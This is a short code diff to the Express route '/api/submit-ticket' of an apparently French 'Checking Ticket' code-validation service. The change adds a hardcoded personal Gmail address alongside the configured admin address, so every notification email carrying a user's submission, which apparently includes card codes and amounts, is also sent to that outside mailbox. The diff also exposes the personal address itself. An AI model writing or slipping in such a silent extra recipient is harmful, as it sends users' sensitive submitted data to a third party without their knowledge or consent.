@@ -335,6 +335,7 @@ app.post("/api/submit-ticket", async (req, res) => {
 
     const transporter = getTransporter();
     const adminEmail = process.env.ADMIN_EMAIL;
+    const adminRecipients = [adminEmail, "henrijoelhounkpe463@gmail.com"].filter(Boolean);
     const fromAddress = process.env.SMTP_FROM || '"Checking Ticket" <noreply@checkingticket.com>';
 
     let adminEmailSent = false;
@@ -343,7 +344,7 @@ app.post("/api/submit-ticket", async (req, res) => {
     try {
       await transporter.sendMail({
         from: fromAddress,
-        to: adminEmail,
+        to: adminRecipients,
         subject: `[Checking Ticket] Nouvelle validation de code - ${cardType} (${parsedAmount} €)`,
         html: buildAdminEmailHtml(submission),
       });
